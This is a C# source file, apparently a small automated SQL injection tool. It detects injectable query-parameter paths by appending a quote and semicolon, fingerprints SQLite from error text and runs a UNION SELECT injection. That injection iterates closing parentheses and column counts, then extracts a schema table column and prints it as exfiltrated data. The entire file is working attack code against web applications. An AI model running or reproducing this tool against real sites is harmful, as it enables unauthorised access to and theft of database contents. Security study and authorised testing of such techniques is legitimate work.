using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Threading.Tasks;
using static Dbms;
using static Handler.Handler;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Threading;

namespace Injection
{
	public class Injection
	{
		public static string baseUrl = "";
		public static List<string> paths = new List<string>();
		public static Dbms dbms = new Dbms();

		public static async Task<bool> DoInjection(string baseUrl, List<string> paths)
		{
			Injection.baseUrl = baseUrl;
			Injection.paths = paths;

			Dotter("Testing injection via query parameter");
			Console.WriteLine("\n"); 
			bool canQueryParameterInjection = await InjectionViaQueryParameter.Test(false);
			//Extendable by adding other SQLi points.

			if (canQueryParameterInjection == false)
				return false;
			
			dbms = await GetDbms(baseUrl, (await InjectionViaQueryParameter.GetInjectablePaths())[0]);
			//If other SQLi points are injectable, test them by sending one of its paths.
			Color("Database information\n" + dbms.ToString(), ConsoleColor.Blue);
			Console.WriteLine();
			Line();

			Console.WriteLine("Performing injection via query parameter:");
			Console.WriteLine();
			bool isQueryParameterInjectionSuccessful = await InjectionViaQueryParameter.Test();

			return true;
		}

		public static async Task<Dbms> GetDbms(string baseUrl, string injectablePath)
		{
			HttpClient client = new HttpClient();
			client.BaseAddress = new Uri(baseUrl);
			client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));

			HttpResponseMessage responseMessage = await client.GetAsync(injectablePath + "';");
			string responseContentString = await responseMessage.Content.ReadAsStringAsync();

			switch (responseContentString.ToLower())
			{
				case string a when a.Contains("sqlite"): return new Dbms("sqlite");
				//Extendable by recognizing other types of DBMS.
			}

			return new Dbms();
		}
	}

	public class InjectionViaQueryParameter
	{
		public static List<string> pathsWithQueryParameter = new List<string>();
		public static List<string> injectablePaths = new List<string>();

		public static async Task<bool> Test(bool performPayloads = true)
		{
			if (pathsWithQueryParameter.Count == 0)
				pathsWithQueryParameter = GetPathsWithQueryParameter();
			if (pathsWithQueryParameter.Count == 0) return false;
			Console.WriteLine("Identified paths with query parameter:");
			Thread.Sleep(1000);
			pathsWithQueryParameter.ForEach(Console.WriteLine);
			Console.WriteLine();

			if (injectablePaths.Count == 0)
				injectablePaths = await GetInjectablePaths();
			if (injectablePaths.Count == 0) return false;
			Console.WriteLine("Injectable paths:"); injectablePaths.ForEach(Console.WriteLine);
			Thread.Sleep(1000);
			Console.WriteLine();

			if (performPayloads == false) return true;

			//Manually inserted desired values, easily convertable to more automatic execution if needed.
			await UnionInjection.UnionPayload(injectablePaths[0], Injection.dbms.databaseSchemaTable, Injection.dbms.databaseSchemaTableDefinition[4]);
			//Extendable by testing other types of SQLi.

			return true;
		}

		public static List<string> GetPathsWithQueryParameter()
		{
			foreach (string path in Injection.paths)
			{
				if (path.Contains('?'))
					pathsWithQueryParameter.Add(path);
			}

			return pathsWithQueryParameter;
		}

		public static async Task<List<string>> GetInjectablePaths()
		{
			List<string> injectablePaths = new List<string>();

			foreach (string path in pathsWithQueryParameter)
			{
				if (await IsInjectable(path))
					injectablePaths.Add(path);
			}

			return injectablePaths;
		}

		public static async Task<bool> IsInjectable(string pathWithQueryParameter)
		{
			HttpClient client = new HttpClient();
			client.BaseAddress = new Uri(Injection.baseUrl);
			client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));

			HttpResponseMessage responseMessage = await client.GetAsync(pathWithQueryParameter + "';");
			return responseMessage.StatusCode == System.Net.HttpStatusCode.InternalServerError;
		}
	}

	public class UnionInjection
	{
		public static async Task UnionPayload(string path, string table, string column)
		{
			HttpClient client = new HttpClient();
			client.BaseAddress = new Uri(Injection.baseUrl);
			client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));

			string singleQuote = "'";
			string parentheses = "";
			string comment = " --";
			string unionSelect = " UNION SELECT ";
			List<string> columns = new List<string>();
			int columnNumber = 0;
			string from = " FROM " + table;

			string statementDividor = "";
			string payload = "";
			Console.WriteLine(payload);

			bool isStatementDividorCorrect = false;
			bool isPayloadCorrect = false;
			//Counter ensures that if certain bad conditions are met, execution will stop.
			int counter = 0;

			do {
				statementDividor = singleQuote + parentheses;
				payload = statementDividor + comment;
				string responseContent = await TestPayload(client, path, payload);
				Line();
				Color(counter + 1 + " - Tested payload for statement dividor: " + payload, ConsoleColor.Blue);
				//Default sqlite error output, would be different application flow if other webpages were tested.
				if (responseContent.Contains("incomplete input"))
				{
					Color("Error response:", ConsoleColor.Red);
					Console.WriteLine(responseContent);
					parentheses += ')';
					counter++;
				}
				else
				{
					isStatementDividorCorrect = true;
					Color("Payload successful, statement dividor set.", ConsoleColor.Green);
				}

			} while (isStatementDividorCorrect == false && counter != 10);

			counter = 0;
			columns.Add("'" + ++columnNumber + "'");

			do {
				payload = statementDividor + unionSelect + string.Join(", ", columns) + from + comment;
				string responseContent = await TestPayload(client, path, payload);
				Line();
				Color(counter + 1 + " - Tested full payload: " + payload, ConsoleColor.Blue);

				//Default sqlite error output, would be different application flow if other webpages were tested.
				if (responseContent.Contains("SELECTs to the left and right of UNION do not have the same number of result columns"))
				{
					columns.Add("'" + ++columnNumber + "'");
					counter++;
				}
				else
				{
					isPayloadCorrect = true;
					Color("Payload successful.", ConsoleColor.Green);
					Console.WriteLine(responseContent);
				}
			} while (isPayloadCorrect == false && counter != 100);

			Line();
			Color("Number of columns found in original SQL query to return: " + columnNumber, ConsoleColor.DarkYellow);
			Color("Desired output to be inserted in a first row: " + column, ConsoleColor.DarkYellow);
			Line();

			columns[0] = column;

			payload = statementDividor + unionSelect + string.Join(", ", columns) + from + comment;
			string responseContentFinal = await TestPayload(client, path, payload);
			Color("Final payload with exfiltrated data: ", ConsoleColor.Green);
			Console.WriteLine(FormatJson(responseContentFinal));
		}

		public static async Task<string> TestPayload(HttpClient client, string path, string payload)
		{
			HttpResponseMessage responseMessage = await client.GetAsync(path + payload);
			string responseContentString = await responseMessage.Content.ReadAsStringAsync();
			//Console.WriteLine(responseContentString);

			return responseContentString;
		}
	}
}
